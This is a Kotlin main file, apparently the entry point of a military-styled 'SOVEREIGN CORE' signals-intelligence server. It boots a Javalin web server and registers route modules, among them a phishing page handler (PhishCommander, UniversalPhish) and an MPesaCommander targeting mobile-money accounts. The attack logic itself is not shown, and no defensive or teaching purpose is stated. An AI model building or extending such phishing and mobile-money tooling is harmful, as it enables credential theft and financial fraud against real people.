package com.fardc.sigint.core

import com.fardc.sigint.services.dsp.SignalClassifier 
import com.fardc.sigint.core.sync.MeshSyncEngine
import com.fardc.sigint.services.transmission.FallbackTransmitter
import io.javalin.Javalin
import java.time.Instant

fun main(args: Array<String>) {
    println("✅ SOVEREIGN CORE v2.4.0 (FULL-COMBAT-READY) boot OK")

    // 1. Initialisation du Noyau (Core) et de la Sécurité
    val vault = SecurityVault() 
    val reporter = MissionReporter(vault)
    val combatHandler = CombatModeHandler() 

    // 2. Initialisation de la Résilience (Fallback & Mesh)
    val meshEngine = MeshSyncEngine(vault, combatHandler)
    val fallbackTx = FallbackTransmitter(vault, combatHandler)

    // 3. Initialisation des Modules de Combat et IA
    val aiEngine = SignalClassifier(vault, combatHandler)
    val bft = BFTModule(combatHandler)
    val mpesa = MPesaCommander(vault, combatHandler)
    val phish = PhishCommander(vault, combatHandler)
    val universal = UniversalPhish(vault, combatHandler)

    // 4. Configuration du Serveur Javalin
    val app = Javalin.create { config ->
        config.showJavalinBanner = false
        config.http.defaultContentType = "application/json; charset=utf-8"
    }.start(7070)

    // 5. Enregistrement des Routes Opérationnelles
    combatHandler.setupRoutes(app)
    meshEngine.setup(app) // Activation du P2P
    bft.setup(app)
    mpesa.setup(app)
    phish.setupPhishPage(app)
    universal.setup(app)

    // 6. Endpoints IA & Inférence
    app.post("/api/ai/classify") { ctx ->
        val result = aiEngine.processInference(ctx.bodyAsBytes())
        if (result["status"] == "LOCKED") ctx.status(403).json(result) else ctx.json(result)
    }

    // 7. Administration et Status Tactique
    app.get("/admin/report") { ctx ->
        val mode = combatHandler.getStatus()
        println("📝 [TRIGGER] Rapport de mission en mode: $mode")
        reporter.generateDailyReport()
        ctx.result("📊 RAPPORT GÉNÉRÉ - ÉTAT TACTIQUE: $mode")
    }

    app.get("/status") { ctx -> 
        val statusInfo = mapOf(
            "system" to "SOVEREIGN-CORE V2.4.0",
            "combat_mode" to combatHandler.getStatus(),
            "ai_engine" to if(combatHandler.isPassiveInterceptionEnabled()) "READY" else "OFFLINE",
            "bft_link" to if(combatHandler.isBFTOperational()) "ACTIVE" else "SILENT",
            "mesh_status" to if(combatHandler.isBFTOperational()) "SYNCING" else "IDLE",
            "fallback" to "OPERATIONAL",
            "timestamp" to Instant.now().toString()
        )
        ctx.json(statusInfo)
    }
}
